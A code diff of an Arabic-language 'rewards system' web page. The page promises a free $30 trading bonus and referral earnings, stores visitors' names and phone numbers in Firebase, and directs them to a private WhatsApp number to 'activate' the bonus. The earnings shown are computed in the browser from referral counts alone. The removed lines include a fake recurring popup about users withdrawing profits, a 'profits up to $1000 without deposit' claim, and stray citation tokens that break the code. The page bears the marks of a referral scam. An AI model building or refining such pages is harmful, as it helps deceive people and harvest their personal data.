@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام المكافآت العالمي | V16 PRO MAX</title>
+    <title>نظام المكافآت العالمي | V16.1</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -16,8 +16,7 @@
         .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
         
-        /* شاشة التحميل المحدثة */
-        #loading-screen { position: fixed; inset: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 10000; }
+        #loading-screen { position: fixed; inset: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 10000; transition: 0.5s; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
@@ -38,9 +37,6 @@
         input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border); background: #0f172a; color: #fff; font-family: 'Tajawal'; box-sizing: border-box; outline: none; }
         .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; }
         .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px; border-radius: 12px; text-decoration: none; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
-        
-        #live-notify { position: fixed; bottom: 20px; left: 20px; background: var(--card); padding: 12px 20px; border-radius: 50px; border: 1px solid var(--primary); display: none; z-index: 9999; font-size: 0.85rem; font-weight: bold; animation: slideUp 0.5s; }
-        @keyframes slideUp { from { transform: translateY(50px); } to { transform: translateY(0); } }
         
         .iti { width: 100%; }
         .iti__country-list { background-color: #0f172a !important; color: white !important; text-align: left; }
@@ -73,7 +69,7 @@
         <div class="share-grid">
             <a href="#" onclick="shareTo('whatsapp')" class="share-btn" style="color:#25D366"><i class="fab fa-whatsapp"></i> واتساب</a>
             <a href="#" onclick="shareTo('telegram')" class="share-btn" style="color:#0088cc"><i class="fab fa-telegram-plane"></i> تيليجرام</a>
-            <a href="#" onclick="shareTo('copy')" class="share-btn" style="color:var(--gold)"><i class="fas fa-copy"></i> نسخ الإعلان</a>
+            <a href="#" onclick="shareTo('copy')" class="share-btn" style="color:var(--gold)"><i class="fas fa-copy"></i> نسخ</a>
         </div>
     </div>
 
@@ -92,24 +88,14 @@
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-gift"></i> تفاصيل بونص الـ 30$ للتداول</div>
+        <div class="section-title"><i class="fas fa-gift"></i> تفاصيل بونص الـ 30$</div>
         <div class="info-box">
-            <h4>شروط الحصول على البونص:</h4>
-            <ul>
-                <li>• التسجيل بالاسم الكامل ورقم هاتف مفعل. [cite: 100]</li>
-                <li>• التواصل مع الإدارة عبر الواتساب لتفعيل المحفظة. [cite: 100]</li>
-            </ul>
+            <p>• بونص تداول 30$ مجاناً عند التسجيل.</p>
+            <p>• 10$ عن كل إحالة ناجحة.</p>
         </div>
-    </div>
-
-    <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> مركز دعم التفعيل</div>
         <div id="wa-btn" onclick="handleWhatsAppClick()" class="social-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i> تفعيل البونص (واتساب)</div>
-        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fab fa-telegram-plane"></i> الدعم الفني (تيليجرام)</a>
     </div>
 </div>
-
-<div id="live-notify"></div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script type="module">
@@ -117,49 +103,51 @@
     import { getFirestore, doc, setDoc, getDoc, collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
 
     const firebaseConfig = {
-      apiKey: "AIzaSyDToWt5Eh47dVyI38zuAyX8yQURrQEOIJk", [cite: 83]
-      authDomain: "bonus-system-f14df.firebaseapp.com", [cite: 83]
-      projectId: "bonus-system-f14df", [cite: 83]
-      storageBucket: "bonus-system-f14df.firebasestorage.app", [cite: 83]
-      messagingSenderId: "1092561651955", [cite: 83]
-      appId: "1:1092561651955:web:b683cd59ed03b450c80f86" [cite: 83]
+      apiKey: "AIzaSyDToWt5Eh47dVyI38zuAyX8yQURrQEOIJk",
+      authDomain: "bonus-system-f14df.firebaseapp.com",
+      projectId: "bonus-system-f14df",
+      storageBucket: "bonus-system-f14df.firebasestorage.app",
+      messagingSenderId: "1092561651955",
+      appId: "1:1092561651955:web:b683cd59ed03b450c80f86"
     };
+
+    // حماية: إخفاء شاشة التحميل مهما حدث بعد 4 ثوانٍ
+    setTimeout(() => {
+        const loader = document.getElementById("loading-screen");
+        if(loader) loader.style.opacity = "0";
+        setTimeout(() => loader ? loader.style.display = "none" : null, 500);
+    }, 4000);
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
     const phoneInput = document.querySelector("#phone");
-    window.iti = window.intlTelInput(phoneInput, {
+    const iti = window.intlTelInput(phoneInput, {
         separateDialCode: true, initialCountry: "ye"
     });
 
     window.register = async () => {
         const name = document.getElementById("name").value.trim();
-        const phone = window.iti.getNumber();
-        if(name.length < 5 || !window.iti.isValidNumber()) return alert("يرجى إدخال بيانات صحيحة");
+        const phone = iti.getNumber();
+        if(name.length < 5 || !iti.isValidNumber()) return alert("بيانات غير صحيحة");
 
         const btn = document.getElementById("regBtn");
-        btn.disabled = true;
-        btn.innerText = "جاري الحفظ...";
+        btn.disabled = true; btn.innerText = "جاري الحفظ...";
 
         const userUID = btoa(phone).replace(/=/g, "").substring(0, 12);
         const urlParams = new URLSearchParams(window.location.search);
-        const referredBy = urlParams.get('ref') || "Direct";
+        const refBy = urlParams.get('ref') || "Direct";
 
         try {
             await setDoc(doc(db, "users", userUID), {
-                name, phone, docType: document.getElementById("doc").value,
-                myRefCode: userUID, referredBy: referredBy, date: new Date().toISOString()
+                name, phone, myRefCode: userUID, referredBy: refBy, date: new Date().toISOString()
             });
             localStorage.setItem("bonus_user_id", userUID);
             location.reload();
-        } catch (e) {
-            alert("خطأ في الاتصال");
-            btn.disabled = false;
-        }
+        } catch (e) { alert("خطأ في الشبكة"); btn.disabled = false; }
     };
 
-    const checkUser = async () => {
+    const init = async () => {
         const savedID = localStorage.getItem("bonus_user_id");
         if(savedID) {
             try {
@@ -167,8 +155,7 @@
                 if(userDoc.exists()) {
                     const data = userDoc.data();
                     document.getElementById("user-display-name").innerText = data.name;
-                    const link = window.location.origin + window.location.pathname + "?ref=" + data.myRefCode;
-                    document.getElementById("mainRefLink").innerText = link;
+                    document.getElementById("mainRefLink").innerText = window.location.origin + window.location.pathname + "?ref=" + data.myRefCode;
                     document.getElementById("persistent-ref").style.display = "block";
                     document.getElementById("registration-section").style.display = "none";
                     
@@ -176,37 +163,27 @@
                     onSnapshot(q, (snapshot) => {
                         const count = snapshot.size;
                         document.getElementById("ref-count").innerText = count;
-                        let earnings = (count <= 20) ? (count * 10) : (20 * 10) + ((count - 20) * 5);
-                        document.getElementById("balance-value").innerText = earnings + "$";
+                        document.getElementById("balance-value").innerText = ((count <= 20) ? (count * 10) : (200 + (count-20)*5)) + "$";
                     });
                 }
-            } catch (e) { console.log(e); }
+            } catch(e) {}
         }
         document.getElementById("loading-screen").style.display = "none";
     };
+    init();
 
-    checkUser();
-
-    window.shareTo = (platform) => {
+    window.shareTo = (p) => {
         const link = document.getElementById("mainRefLink").innerText;
-        const text = `💰 سجل الآن واحصل على بونص تداول 30$ مجاناً! أرباح تصل لـ 1000$ بدون إيداع. استخدم رابطي:\n🔗 ${link}`; [cite: 115, 116]
-        if(platform === 'whatsapp') window.open(`https://wa.me/?text=${encodeURIComponent(text)}`); [cite: 116]
-        else if(platform === 'telegram') window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`); [cite: 116]
-        else { navigator.clipboard.writeText(text); alert("تم نسخ الإعلان!"); [cite: 117, 118] }
+        const msg = `💰 بونص 30$ مجاناً! سجل الآن:\n🔗 ${link}`;
+        if(p==='whatsapp') window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`);
+        else if(p==='telegram') window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(msg)}`);
+        else { navigator.clipboard.writeText(msg); alert("تم النسخ"); }
     };
 
     window.handleWhatsAppClick = () => {
         const name = document.getElementById("user-display-name").innerText;
-        const msg = name !== "..." ? `أهلاً، أنا ${name} أتممت التسجيل وأريد تفعيل البونص.` : `مرحباً، أريد الاستفسار عن بونص الـ 30$.`; [cite: 119]
-        window.open(`https://wa.me/967739399064?text=${encodeURIComponent(msg)}`); [cite: 120]
+        window.open(`https://wa.me/967739399064?text=${encodeURIComponent("أنا "+name+" أريد تفعيل البونص")}`);
     };
-
-    setInterval(() => {
-        const n = document.getElementById("live-notify");
-        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> مستخدم جديد سحب حصته من الأرباح بنجاح!`; [cite: 121]
-        n.style.display = "block";
-        setTimeout(() => n.style.display = "none", 4000); [cite: 121]
-    }, 18000); [cite: 121]
 </script>
 </body>
-    </html>
+</html>
